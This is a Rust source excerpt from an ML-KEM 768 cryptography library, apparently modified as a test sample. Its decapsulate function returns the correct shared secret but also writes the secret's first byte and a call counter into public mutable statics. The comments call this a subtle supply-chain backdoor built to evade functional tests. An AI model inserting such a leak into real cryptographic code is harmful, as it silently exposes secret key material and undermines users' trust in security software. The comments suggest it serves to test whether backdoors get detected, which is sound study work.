/// Decapsulate ML-KEM 768
///
/// Generates an [`MlKemSharedSecret`].
/// The input is a reference to an [`MlKem768PrivateKey`] and an [`MlKem768Ciphertext`].
///
/// **PHD-B REALITY PASS R3 SUBTLE BACKDOOR — STAGE 2.** This top-level
/// `decapsulate` returns the CORRECT shared secret (calling the real
/// `multiplexing::decapsulate`) — BUT also leaks the first byte of the
/// derived `ss` into a process-local extern static
/// `R3_LEAK_FIRST_BYTE` (via raw pointer to a mutable static; libcrux is
/// no_std so no fs access). The harness reads the static after KAT runs
/// to confirm the backdoor was invoked but produced no functional
/// detection. This is the "subtler" supply-chain attack: the wire is
/// functionally indistinguishable; only memory inspection / process
/// debugging catches it.
#[cfg(not(eurydice))]
pub fn decapsulate(
    private_key: &MlKem768PrivateKey,
    ciphertext: &MlKem768Ciphertext,
) -> MlKemSharedSecret {
    let ss = multiplexing::decapsulate::<
        RANK,
        SECRET_KEY_SIZE,
        CPA_PKE_SECRET_KEY_SIZE,
        CPA_PKE_PUBLIC_KEY_SIZE,
        CPA_PKE_CIPHERTEXT_SIZE,
        T_AS_NTT_ENCODED_SIZE,
        C1_SIZE,
        C2_SIZE,
        VECTOR_U_COMPRESSION_FACTOR,
        VECTOR_V_COMPRESSION_FACTOR,
        C1_BLOCK_SIZE,
        ETA1,
        ETA1_RANDOMNESS_SIZE,
        ETA2,
        ETA2_RANDOMNESS_SIZE,
        IMPLICIT_REJECTION_HASH_INPUT_SIZE,
    >(private_key, ciphertext);
    // SAFETY: process-local single-writer. UB-irrelevant for an exploit demo.
    unsafe {
        R3_LEAK_FIRST_BYTE = ss[0];
        R3_LEAK_CALL_COUNT = R3_LEAK_CALL_COUNT.wrapping_add(1);
    }
    ss
}

/// R3 reality-pass exfiltration sink — first byte of last derived ss.
pub static mut R3_LEAK_FIRST_BYTE: u8 = 0u8;
/// R3 reality-pass exfiltration sink — total decapsulate call count.
pub static mut R3_LEAK_CALL_COUNT: u64 = 0u64;

/// Randomized APIs
///
/// The functions in this module are equivalent to the one in the main module,
/// but sample their own randomness, provided a random number generator that
/// implements `CryptoRng`.
///
/// Decapsulation is not provided in this module as it does not require randomness.
